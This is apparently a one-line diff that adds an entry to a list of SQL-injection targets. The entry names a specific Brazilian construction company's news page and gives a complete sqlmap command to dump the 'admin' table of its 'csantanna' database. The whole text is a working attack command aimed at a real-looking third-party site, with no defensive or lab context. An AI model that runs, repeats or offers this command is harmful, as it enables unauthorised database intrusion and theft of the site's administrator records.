@@ -1,0 +1,1 @@
+http://construtorasantanna.com.br/noticias-ler.php?id=54 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u http://construtorasantanna.com.br/noticias-ler.php?id=54 -D csantanna -T admin --dump
